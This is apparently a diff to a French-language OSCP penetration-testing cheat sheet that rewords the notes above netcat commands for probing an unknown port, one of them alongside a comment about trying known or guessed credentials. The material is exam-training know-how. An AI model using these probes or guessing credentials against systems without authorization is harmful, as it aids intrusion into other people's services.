-<p class="oscp-command-note">Établir ou tester une connexion avec Netcat.</p>
+<p class="oscp-command-note">Netcat/Telnet : établir la connexion TCP au service «Port inconnu».</p>
 
 ```bash
 # Connectez-vous au port inconnu pour identifier le service
@@ -3063,7 +3063,7 @@ help
 ```
 
 
-<p class="oscp-command-note">Afficher ou écrire une valeur.</p>
+<p class="oscp-command-note">Écrire le contenu précisé dans le fichier de destination.</p>
 
 ```bash
 # Tentative de connexion avec des identifiants connus ou devinés
@@ -3077,7 +3077,7 @@ echo "list" | nc -nv <IP> <PORT>
 ```
 
 
-<p class="oscp-command-note">Script shell dans la rubrique « Unkown Port ».</p>
+<p class="oscp-command-note">Exemple ou valeur de référence pour «Port inconnu» : vérifier le contexte avant usage.</p>
 
 ```bash
 # Après avoir identifié le service, référez-vous à sa documentation ou à sa commande par défaut
